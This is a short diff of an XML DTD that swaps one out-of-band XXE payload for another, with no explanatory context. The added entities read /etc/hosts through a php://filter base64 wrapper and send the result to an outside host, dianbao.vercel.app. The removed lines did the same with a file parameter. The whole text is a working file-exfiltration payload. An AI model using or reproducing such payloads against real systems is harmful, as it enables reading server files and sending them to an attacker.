@@ -1,3 +1,4 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/?%file;'>">
-%all;
+	<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
+	<!ENTITY % int "<!ENTITY %#37; trick SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/?p=%payl'>">
+
